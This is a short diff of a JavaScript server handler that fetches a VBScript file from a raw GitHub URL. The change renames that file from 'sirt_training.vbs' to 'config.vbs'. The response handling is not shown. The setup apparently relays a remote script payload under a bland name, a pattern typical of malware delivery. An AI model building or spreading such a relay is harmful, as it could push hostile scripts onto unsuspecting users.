@@ -1,5 +1,5 @@
 export default async function handler(req, res) {
-  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/sirt_training.vbs';
+  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/config.vbs';
 
   try {
     const response = await fetch(rawUrl);
